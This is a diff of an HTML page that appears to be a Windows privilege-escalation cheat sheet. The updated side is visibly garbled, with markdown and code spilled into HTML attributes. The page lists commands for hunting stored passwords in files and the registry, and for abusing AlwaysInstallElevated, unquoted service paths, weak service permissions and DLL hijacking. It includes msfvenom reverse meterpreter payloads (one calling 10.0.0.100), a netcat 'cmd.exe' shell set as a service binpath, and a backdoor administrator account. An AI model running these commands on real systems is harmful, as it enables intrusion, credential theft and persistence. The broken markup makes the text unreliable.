@@ -39,7 +39,7 @@
 
     
 
-    <meta name="generator" content="Hugo 0.54.0" />
+    <meta name="generator" content="Hugo 0.57.2" />
   </head>
 
   <body class=" ">
@@ -155,10 +155,8 @@
 <p>Only applicable for devices connected to a domain</p>
 
 <ul>
-<li>Groups.xml stored in SYSVOL -&gt; DC, encrypted with AES, but key got leaked
-<code>
-\\dc2018.lab\SYSVOL\dc2008.lab\Policies\{id}\MACHINE\Preferences\Groups
-</code></li>
+<li><p>Groups.xml stored in SYSVOL -&gt; DC, encrypted with AES, but key got leaked</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">\\dc2018.lab\SYSVOL\dc2008.lab\Policies\{id}\MACHINE\Preferences\Groups</pre></div></li>
 </ul>
 
 <h3 id="other-files">Other Files</h3>
@@ -178,207 +176,182 @@
 <h3 id="other-misc-passwords">Other Misc Passwords</h3>
 
 <ul>
-<li><p><code>dir /s *pass* == *cred* == *vnc* == *.config*</code></p></li>
+<li><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dir /s *pass* == *cred* == *vnc* == *.config*```" data-lang="dir /s *pass* == *cred* == *vnc* == *.config*```">- ```findstr /si password *.xml *.ini *.txt```
 
-<li><p><code>findstr /si password *.xml *.ini *.txt</code></p></li>
+- ```reg query HKLM /f password /t REG_SZ /s```
 
-<li><p><code>reg query HKLM /f password /t REG_SZ /s</code></p></li>
+- ```reg query HKCU /f password /t REG_SZ /s```
 
-<li><p><code>reg query HKCU /f password /t REG_SZ /s</code></p></li>
+- web.config
 
-<li><p>web.config</p></li>
+- php.ini
 
-<li><p>php.ini</p></li>
+- httpd.conf
 
-<li><p>httpd.conf</p></li>
+- access.log
 
-<li><p>access.log</p></li>
+- PowerUp:
+* Get-WebConfig (ISS &gt; web.config)
 
-<li><p>PowerUp:</p>
+- PuTTY:
+- ```reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions```
 
-<ul>
-<li>Get-WebConfig (ISS &gt; web.config)</li>
-</ul></li>
+- Tight VNC:
 
-<li><p>PuTTY:</p>
+- ```reg query HKCU\Software\TightVNC\Server```
 
-<ul>
-<li><code>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions</code></li>
-</ul></li>
+- ```bncpwd.exe &lt;encrypted_password&gt;```
 
-<li><p>Tight VNC:</p>
+- Always Install Elevated:
 
-<ul>
-<li><p><code>reg query HKCU\Software\TightVNC\Server</code></p></li>
+- ```reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated```
 
-<li><p><code>bncpwd.exe &lt;encrypted_password&gt;</code></p></li>
-</ul></li>
+- ```reg query HKCU\SOFTWARE\Policies\Micorosft\Windows\Installer\AlwaysInstalledElevated```
 
-<li><p>Always Install Elevated:</p>
+* both values = 1, created a malicious .msi file with msfvenom for example
 
-<ul>
-<li><p><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated</code></p></li>
+* execute it with ```msiexec /quiet /qn /i &lt;filename.msi&gt;```
 
-<li><p><code>reg query HKCU\SOFTWARE\Policies\Micorosft\Windows\Installer\AlwaysInstalledElevated</code></p></li>
+- PowerUp:
 
-<li><p>both values = 1, created a malicious .msi file with msfvenom for example</p></li>
+- ```Get-RegistryAlwaysInstallElevated```
 
-<li><p>execute it with <code>msiexec /quiet /qn /i &lt;filename.msi&gt;</code></p></li>
-</ul></li>
+- ```Write-UserAddMSI```
 
-<li><p>PowerUp:</p>
+### Unquoted Services Paths (Trusted Service Paths)
 
-<ul>
-<li><p><code>Get-RegistryAlwaysInstallElevated</code></p></li>
+For each space in a file path, Windows will attempt to look for and execute programs with a name that matches the word in front of the space.
 
-<li><p><code>Write-UserAddMSI</code></p></li>
-</ul></li>
-</ul>
+Example:
 
-<h3 id="unquoted-services-paths-trusted-service-paths">Unquoted Services Paths (Trusted Service Paths)</h3>
+* C:\Program Files\Some Folder\Service.exe
 
-<p>For each space in a file path, Windows will attempt to look for and execute programs with a name that matches the word in front of the space.</p>
+* C:\Program.exe
 
-<p>Example:</p>
+* C:\Program Files\Some.exe
 
-<ul>
-<li><p>C:\Program Files\Some Folder\Service.exe</p></li>
+* C:\Program Files\Some Folder\Service.exe
 
-<li><p>C:\Program.exe</p></li>
 
-<li><p>C:\Program Files\Some.exe</p></li>
+- ```wmic service get name,displayname,pathname,startmode | findstr /i &#34;Auto&#34; | findstr /i /v &#34;C:\Windows\\&#34; | findstr /i /v &#34;&#34;&#34;```
 
-<li><p>C:\Program Files\Some Folder\Service.exe</p></li>
-
-<li><p><code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></p></li>
-</ul>
-
-<p>PFNet
+PFNet
 * C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfscv.exe
-* icalcs &ldquo;C:\Program Files (x86)\Privacyware&rdquo;
+* icalcs &#34;C:\Program Files (x86)\Privacyware&#34;
 * msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe
 Start and stop the service:
 * sc stop PFNet
 * sc start PFNET
 Powerup:
 * Get-ServiceUnquoted
-* Write-ServiceBinary -Name <service_name> -Path <hijack_path>
+* Write-ServiceBinary -Name &lt;service_name&gt; -Path &lt;hijack_path&gt;
 Insecure Service Permissions
-* whoami &gt; net user <name> - enumerate groups
+* whoami &gt; net user &lt;name&gt; - enumerate groups
 * accesschk.exe -&gt; part of sysinternals
-* accesschk.exe -ucqv <service name>
-* accesschk.exe -uwcqv &ldquo;Authenticated Users&rdquo; * /accepteula</p>
+* accesschk.exe -ucqv &lt;service name&gt;
+* accesschk.exe -uwcqv &#34;Authenticated Users&#34; * /accepteula
 
-<p>Write access to a service as authenticated user?
+Write access to a service as authenticated user?
 W-XP ssdprsv and upnphost by default:
 sc qc upnphost
-sc config upnphost binpath= &ldquo;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&rdquo;
-net start upnphost</p>
+sc config upnphost binpath= &#34;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&#34;
+net start upnphost
 
-<p>Powerup:
+
+Powerup:
 * Get-ModifiableService
 * Test-ServiceDaclPermission
-* Invoke-ServiceAbuse -Name <service_name> -Command <command></p>
+* Invoke-ServiceAbuse -Name &lt;service_name&gt; -Command &lt;command&gt;
 
-<h3 id="dll-hijacking">DLL Hijacking</h3>
 
-<p>Requires User Interaction / Reboot.</p>
+### DLL Hijacking
 
-<p>DLL search order on 32-bit systems:</p>
+Requires User Interaction / Reboot.
 
-<ol>
-<li><p>The directory from which the application is loaded</p></li>
+DLL search order on 32-bit systems:
 
-<li><p>32-bit System directory (C:\Windows\System32)</p></li>
+1. The directory from which the application is loaded
 
-<li><p>16-bit System directory (C:\Windows\System)</p></li>
+2. 32-bit System directory (C:\Windows\System32)
 
-<li><p>Windows directory (C:\Windows)</p></li>
+3. 16-bit System directory (C:\Windows\System)
 
-<li><p>The current working directory</p></li>
+4. Windows directory (C:\Windows)
 
-<li><p>Directories in the PATH environment variable</p></li>
-</ol>
+5. The current working directory
 
-<p>You can use procmon to look for vulnerable DLL&rsquo;s using the following filters:</p>
+6. Directories in the PATH environment variable
 
-<ul>
-<li><p>result is NAME NOT FOUND Include</p></li>
+You can use procmon to look for vulnerable DLL&#39;s using the following filters:
 
-<li><p>path ends with .dll</p></li>
+- result is NAME NOT FOUND Include
+
+- path ends with .dll</code></pre></div></li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">echo %path%
+
+<p>echo %path%
 icacls C:\Python27
-accesssschk.exe -dqv &#34;C:\Python27&#34;
-sc qc IKEEXT</pre></div>
-<p>Generate a malicious payload with msfvenom:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=&lt;ip&gt; lport=&lt;port&gt; -f dll &gt; evil.dll</pre></div>
-<p>Windows 7 x86/64:</p>
+accesssschk.exe -dqv &ldquo;C:\Python27&rdquo;
+sc qc IKEEXT</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">Generate a malicious payload with msfvenom:</pre></div>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f dll &gt; evil.dll</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">Windows 7 x86/64:
 
-<ul>
-<li>IKE and AuthIP IPsec Keying Modules (IKEEEXT) - wlbsctrl.dll</li>
-</ul>
+- IKE and AuthIP IPsec Keying Modules (IKEEEXT) - wlbsctrl.dll
 
-<p>PowerUp:</p>
+PowerUp:
 
-<ul>
-<li><code>Find-PathDLLHijack</code></li>
-<li><code>Find-ProjcessDLLHijack</code></li>
-<li><code>Wire-HijackDll</code></li>
-</ul>
+- ```Find-PathDLLHijack```
+- ```Find-ProjcessDLLHijack```
+- ```Wire-HijackDll```
 
-<h3 id="schedulded-tasks">Schedulded Tasks:</h3>
+### Schedulded Tasks:
 
-<p>On Windows Server 2000, 2003 and Windows XP, scheduled tasks are running as system. Are they calling any .exe&rsquo;s and can you overwrite?</p>
-
-<p><code>accesschk.exe -dqv &lt;folder path&gt;</code></p>
+On Windows Server 2000, 2003 and Windows XP, scheduled tasks are running as system. Are they calling any .exe&#39;s and can you overwrite?</pre></div>
+<p>accesschk.exe -dqv <folder path>```</p>
 
 <p>Can you create a task yourself?</p>
-
-<p><code>net start &quot;Task Scheduler&quot; at &lt;hour:minute&gt; /interactive &quot;path to evil exe&quot;</code></p>
-
-<p>PowerUp:</p>
-
-<p><code>Get-ModifiableScheduledTaskFile</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-net start "Task Scheduler" at <hour:minute> /interactive "path to evil exe"```" data-lang="net start "Task Scheduler" at <hour:minute> /interactive "path to evil exe"```">PowerUp:</code></pre></div>
+<p>Get-ModifiableScheduledTaskFile```</p>
 
 <h3 id="useful-commands">Useful Commands</h3>
 
 <ul>
-<li><p><code>hostname</code></p></li>
+<li><code>hostname</code>
 
-<li><p><code>echo %username%</code></p></li>
+- <code>echo %username%</code>
 
-<li><p><code>whoami / priv</code></p></li>
+- <code>whoami / priv</code>
 
-<li><p><code>swinsta - other logged in users</code></p></li>
+- <code>swinsta - other logged in users</code>
 
-<li><p><code>net users</code></p></li>
+- <code>net users</code>
 
-<li><p><code>net user &lt;username&gt;</code></p></li>
+- <code>net user &lt;username&gt;</code>
 
-<li><p><code>net localgroup</code></p></li>
+- <code>net localgroup</code>
 
-<li><p><code>net localgroup Administrators</code></p></li>
+- <code>net localgroup Administrators</code>
 
-<li><p><code>net user rottenadmin P@ssword123! /add</code></p></li>
+- <code>net user rottenadmin P@ssword123! /add</code>
 
-<li><p><code>net localgroup Administrators rottenadmin /add</code></p></li>
+- <code>net localgroup Administrators rottenadmin /add</code>
 
-<li><p><code>ipconfing /all</code></p></li>
+- <code>ipconfing /all</code>
 
-<li><p><code>route print</code></p></li>
+- <code>route print</code>
 
-<li><p><code>arp -a</code></p></li>
+- <code>arp -a</code>
 
-<li><p><code>netstat -ano</code></p></li>
+- <code>netstat -ano</code>
 
-<li><p><code>type C:\WINDOWS\System32\drivers\etc\hosts</code></p></li>
+- <code>type C:\WINDOWS\System32\drivers\etc\hosts</code>
 
-<li><p><code>schtasks /query /fo LIST /v - scheduled task</code></p></li>
+- <code>schtasks /query /fo LIST /v - scheduled task</code>
 
-<li><p><code>tasklist /SVC - running processes</code></p></li>
+- <code>tasklist /SVC - running processes</code>
 
-<li><p><code>net start - started services</code></p></li>
+- <code>net start - started services</code></li>
 </ul>
 
   </article>
